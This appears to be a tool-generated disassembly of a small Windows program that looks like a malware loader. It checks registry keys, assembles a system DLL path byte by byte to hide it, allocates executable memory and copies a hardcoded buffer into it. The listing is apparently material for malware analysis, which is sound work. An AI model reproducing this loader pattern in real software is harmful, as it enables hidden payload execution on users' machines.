0x00401000:	pushl	%ebp	; from: 0x004011a0(MAY)
0x00401001:	movl	%esp, %ebp
0x00401003:	movl	$0x402335, 0x00417c64
0x0040100d:	popl	%ebp
0x0040100e:	ret	; targets: 0x004011a5(MAY)


start:
0x00401020:	pushl	%ebp
0x00401021:	movl	%esp, %ebp
0x00401023:	subl	$0x16c, %esp
0x00401029:	pusha	
0x0040102a:	movl	%ebp, 0x00417c68
0x00401030:	movl	$0x0, -324(%ebp)
0x0040103a:	leal	-296(%ebp), %eax
0x00401040:	pushl	%eax
0x00401041:	pushl	$0x20019
0x00401046:	pushl	$0x0
0x00401048:	pushl	$0x40206c
0x0040104d:	pushl	$0x80000002
0x00401052:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000020(MAY)
0x00401058:	testl	%eax, %eax
0x0040105a:	je	0x0040106b	; targets: 0x0040106b(MAY), 0x0040105c(MAY)
0x0040105c:	pushl	$0x4	; from: 0x0040105a(MAY)
0x0040105e:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000010(MAY)
0x00401064:	xorl	%eax, %eax
0x00401066:	jmp	0x0040144e	; targets: 0x0040144e(MAY)
0x0040106b:	leal	-296(%ebp), %ecx	; from: 0x0040105a(MAY)
0x00401071:	pushl	%ecx
0x00401072:	pushl	$0x20019
0x00401077:	pushl	$0x0
0x00401079:	pushl	$0x402080
0x0040107e:	movl	-296(%ebp), %edx
0x00401084:	pushl	%edx
0x00401085:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000020(MAY)
0x0040108b:	testl	%eax, %eax
0x0040108d:	je	0x0040109e	; targets: 0x0040109e(MAY), 0x0040108f(MAY)
0x0040108f:	pushl	$0x4	; from: 0x0040108d(MAY)
0x00401091:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000010(MAY)
0x00401097:	xorl	%eax, %eax
0x00401099:	jmp	0x0040144e	; targets: 0x0040144e(MAY)
0x0040109e:	leal	-296(%ebp), %eax	; from: 0x0040108d(MAY)
0x004010a4:	pushl	%eax
0x004010a5:	pushl	$0x20019
0x004010aa:	pushl	$0x0
0x004010ac:	pushl	$0x402090
0x004010b1:	movl	-296(%ebp), %ecx
0x004010b7:	pushl	%ecx
0x004010b8:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000020(MAY)
0x004010be:	testl	%eax, %eax
0x004010c0:	je	0x004010d1	; targets: 0x004010d1(MAY), 0x004010c2(MAY)
0x004010c2:	pushl	$0x4	; from: 0x004010c0(MAY)
0x004010c4:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000010(MAY)
0x004010ca:	xorl	%eax, %eax
0x004010cc:	jmp	0x0040144e	; targets: 0x0040144e(MAY)
0x004010d1:	movl	CreateFileA@kernel32.dll, %edx	; from: 0x004010c0(MAY)
0x004010d7:	movl	%edx, -344(%ebp)
0x004010dd:	movl	$0x0, -276(%ebp)
0x004010e7:	movl	$0x64, -316(%ebp)
0x004010f1:	movl	$0x1, -284(%ebp)
0x004010fb:	movl	$0x0, -324(%ebp)
0x00401105:	movl	$0x0, -292(%ebp)
0x0040110f:	movl	$0x1, -312(%ebp)
0x00401119:	movl	$0x3, -280(%ebp)
0x00401123:	pushl	$0x104
0x00401128:	leal	-272(%ebp), %eax
0x0040112e:	pushl	%eax
0x0040112f:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000040(MAY)
0x00401135:	call	0x004014f0	; targets: 0x004014f0(MAY)
0x0040113a:	leal	-296(%ebp), %ecx	; from: 0x00401597(MAY)
0x00401140:	pushl	%ecx
0x00401141:	pushl	$0x20019
0x00401146:	pushl	$0x0
0x00401148:	pushl	$0x4020b0
0x0040114d:	movl	-296(%ebp), %edx
0x00401153:	pushl	%edx
0x00401154:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000020(MAY)
0x0040115a:	testl	%eax, %eax
0x0040115c:	je	0x0040116d	; targets: 0x0040116d(MAY), 0x0040115e(MAY)
0x0040115e:	pushl	$0x4	; from: 0x0040115c(MAY)
0x00401160:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000010(MAY)
0x00401166:	xorl	%eax, %eax
0x00401168:	jmp	0x0040144e	; targets: 0x0040144e(MAY)
0x0040116d:	leal	-296(%ebp), %eax	; from: 0x0040115c(MAY)
0x00401173:	pushl	%eax
0x00401174:	pushl	$0x20019
0x00401179:	pushl	$0x0
0x0040117b:	pushl	$0x40209c
0x00401180:	movl	-296(%ebp), %ecx
0x00401186:	pushl	%ecx
0x00401187:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000020(MAY)
0x0040118d:	testl	%eax, %eax
0x0040118f:	jne	0x004011a0	; targets: 0x00401191(MAY), 0x004011a0(MAY)
0x00401191:	pushl	$0x4	; from: 0x0040118f(MAY)
0x00401193:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000010(MAY)
0x00401199:	xorl	%eax, %eax
0x0040119b:	jmp	0x0040144e	; targets: 0x0040144e(MAY)
0x004011a0:	call	0x00401000	; targets: 0x00401000(MAY)	; from: 0x0040118f(MAY)
0x004011a5:	movl	0x00417c64, %edx	; from: 0x0040100e(MAY)
0x004011ab:	pushl	%edx
0x004011ac:	call	0x004015a0	; targets: 0x004015a0(MAY)
0x004011b1:	addl	$0x4, %esp	; from: 0x004015aa(MAY)
0x004011b4:	movl	%eax, -328(%ebp)
0x004011ba:	movl	-328(%ebp), %eax
0x004011c0:	pushl	%eax
0x004011c1:	call	0x00401720	; targets: 0x00401720(MAY)
0x004011c6:	addl	$0x4, %esp	; from: 0x00401741(MAY)
0x004011c9:	movl	%eax, -320(%ebp)
0x004011cf:	movl	-328(%ebp), %ecx
0x004011d5:	pushl	%ecx
0x004011d6:	pushl	$0x0
0x004011d8:	movl	-320(%ebp), %edx
0x004011de:	pushl	%edx
0x004011df:	call	0x00401670	; targets: 0x00401670(MAY)
0x004011e4:	addl	$0xc, %esp	; from: 0x00401674(MAY)
0x004011e7:	movl	-328(%ebp), %eax
0x004011ed:	movl	%eax, -336(%ebp)
0x004011f3:	movl	-324(%ebp), %ecx
0x004011f9:	cmpl	-328(%ebp), %ecx
0x004011ff:	jae	0x0040128b	; targets: 0x00401205(MAY)
0x00401205:	movl	-336(%ebp), %edx	; from: 0x004011ff(MAY)
0x0040120b:	pushl	%edx
0x0040120c:	movl	-316(%ebp), %eax
0x00401212:	pushl	%eax
0x00401213:	call	0x00401460	; targets: 0x00401460(MAY)
0x00401218:	addl	$0x8, %esp	; from: 0x00401487(MAY)
0x0040121b:	movl	%eax, -340(%ebp)
0x00401221:	movl	-340(%ebp), %ecx
0x00401227:	pushl	%ecx
0x00401228:	movl	0x00417c64, %edx
0x0040122e:	addl	-292(%ebp), %edx
0x00401234:	pushl	%edx
0x00401235:	movl	-320(%ebp), %eax
0x0040123b:	addl	-324(%ebp), %eax
0x00401241:	pushl	%eax
0x00401242:	call	0x00401490	; targets: 0x00401490(MAY)
0x0040144e:	movl	%ebp, %esp	; from: 0x00401066(MAY), 0x00401099(MAY), 0x0040119b(MAY), 0x00401168(MAY), 0x004010cc(MAY)
0x00401450:	popl	%ebp
0x00401451:	ret	; targets: 0xfee70000(MAY)

0x00401460:	pushl	%ebp	; from: 0x00401213(MAY)
0x00401461:	movl	%esp, %ebp
0x00401463:	subl	$0x8, %esp
0x00401466:	movl	0x8(%ebp), %eax
0x00401469:	movl	%eax, -4(%ebp)
0x0040146c:	movl	0xc(%ebp), %ecx
0x0040146f:	movl	%ecx, -8(%ebp)
0x00401472:	movl	-4(%ebp), %edx
0x00401475:	cmpl	-8(%ebp), %edx
0x00401478:	jae	0x00401481	; targets: 0x0040147a(MAY)
0x0040147a:	movl	-4(%ebp), %eax	; from: 0x00401478(MAY)
0x0040147d:	jmp	0x00401484	; targets: 0x00401484(MAY)
0x00401484:	movl	%ebp, %esp	; from: 0x0040147d(MAY)
0x00401486:	popl	%ebp
0x00401487:	ret	; targets: 0x00401218(MAY)

0x00401490:	pushl	%ebp	; from: 0x00401242(MAY)
0x00401491:	movl	%esp, %ebp
0x00401493:	subl	$0xc, %esp
0x00401496:	movl	$0xf51a, -4(%ebp)
0x0040149d:	movl	$0x6, -4(%ebp)
0x004014a4:	movl	$0x0, -12(%ebp)
0x004014ab:	jmp	0x004014b6	; targets: 0x004014b6(MAY)
0x004014ad:	movl	-12(%ebp), %eax	; from: 0x004014ea(MAY)
0x004014b0:	addl	$0x1, %eax
0x004014b3:	movl	%eax, -12(%ebp)
0x004014b6:	movl	-12(%ebp), %ecx	; from: 0x004014ab(MAY)
0x004014b9:	cmpl	0x10(%ebp), %ecx
0x004014bc:	jnl	0x004014ec	; targets: 0x004014be(MAY), 0x004014ec(MAY)
0x004014be:	movl	$0x6, -4(%ebp)	; from: 0x004014bc(MAY)
0x004014c5:	movl	0xc(%ebp), %edx
0x004014c8:	addl	-12(%ebp), %edx
0x004014cb:	movzbl	(%edx), %eax
0x004014ce:	movl	%eax, -8(%ebp)
0x004014d1:	movl	$0x6, -4(%ebp)
0x004014d8:	movl	0x8(%ebp), %ecx
0x004014db:	addl	-12(%ebp), %ecx
0x004014de:	movb	-8(%ebp), %dl
0x004014e1:	movb	%dl, (%ecx)
0x004014e3:	movl	$0x6, -4(%ebp)
0x004014ea:	jmp	0x004014ad	; targets: 0x004014ad(MAY)
0x004014ec:	movl	%ebp, %esp	; from: 0x004014bc(MAY)
0x004014ee:	popl	%ebp
0x004014ef:	ret	; targets: unresolved

0x004014f0:	pushl	%ebp	; from: 0x00401135(MAY)
0x004014f1:	movl	%esp, %ebp
0x004014f3:	movl	0x00402014, %eax
0x004014f8:	movb	$0x73, 0x3(%eax)
0x004014fc:	movl	0x00402014, %ecx
0x00401502:	movb	$0x74, 0x4(%ecx)
0x00401506:	movl	0x00402014, %edx
0x0040150c:	movb	$0x65, 0x5(%edx)
0x00401510:	movl	0x00402014, %eax
0x00401515:	movb	$0x6d, 0x6(%eax)
0x00401519:	movl	0x00402014, %ecx
0x0040151f:	movb	$0x33, 0x7(%ecx)
0x00401523:	movl	0x00402014, %edx
0x00401529:	movb	$0x32, 0x8(%edx)
0x0040152d:	movl	0x00402014, %eax
0x00401532:	movb	$0x5c, 0x9(%eax)
0x00401536:	movl	0x00402014, %ecx
0x0040153c:	movb	$0x61, 0xa(%ecx)
0x00401540:	movl	0x00402014, %edx
0x00401546:	movb	$0x74, 0xb(%edx)
0x0040154a:	movl	0x00402014, %eax
0x0040154f:	movb	$0x6c, 0xc(%eax)
0x00401553:	movl	0x00402014, %ecx
0x00401559:	movb	$0x2e, 0xd(%ecx)
0x0040155d:	movl	0x00402014, %edx
0x00401563:	movb	$0x64, 0xe(%edx)
0x00401567:	movl	0x00402014, %eax
0x0040156c:	movb	$0x6c, 0xf(%eax)
0x00401570:	movl	0x00402014, %ecx
0x00401576:	movb	$0x6c, 0x10(%ecx)
0x0040157a:	movl	0x00402014, %edx
0x00401580:	movb	$0x5c, (%edx)
0x00401583:	movl	0x00402014, %eax
0x00401588:	movb	$0x73, 0x1(%eax)
0x0040158c:	movl	0x00402014, %ecx
0x00401592:	movb	$0x79, 0x2(%ecx)
0x00401596:	popl	%ebp
0x00401597:	ret	; targets: 0x0040113a(MAY)

0x004015a0:	pushl	%ebp	; from: 0x004011ac(MAY)
0x004015a1:	movl	%esp, %ebp
0x004015a3:	movl	0x8(%ebp), %eax
0x004015a6:	movl	-4(%eax), %eax
0x004015a9:	popl	%ebp
0x004015aa:	ret	; targets: 0x004011b1(MAY)

0x00401670:	pushl	%ebp	; from: 0x004011df(MAY)
0x00401671:	movl	%esp, %ebp
0x00401673:	popl	%ebp
0x00401674:	ret	; targets: 0x004011e4(MAY)

0x00401720:	pushl	%ebp	; from: 0x004011c1(MAY)
0x00401721:	movl	%esp, %ebp
0x00401723:	pushl	%ecx
0x00401724:	movl	$0x4, -4(%ebp)
0x0040172b:	pushl	$0x40
0x0040172d:	pushl	$0x3000
0x00401732:	movl	0x8(%ebp), %eax
0x00401735:	pushl	%eax
0x00401736:	pushl	$0x0
0x00401738:	call	VirtualAlloc@kernel32.dll	; targets: 0xff000050(MAY)
0x0040173e:	movl	%ebp, %esp
0x00401740:	popl	%ebp
0x00401741:	ret	; targets: 0x004011c6(MAY)

